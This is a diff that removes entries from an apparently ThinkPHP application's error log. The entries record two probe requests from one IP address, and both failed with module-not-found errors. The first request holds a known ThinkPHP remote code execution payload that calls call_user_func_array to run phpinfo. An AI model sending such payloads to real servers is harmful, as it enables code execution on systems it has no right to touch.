@@ -1,6 +1,0 @@
-[ 2019-08-25T04:04:19+08:00 ] 223.252.222.228 /TP/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
-ERR: 无法加载模块:Index
-
-[ 2019-08-25T04:04:19+08:00 ] 223.252.222.228 /TP/index.php?s=captcha
-ERR: 无法加载模块:Captcha
-
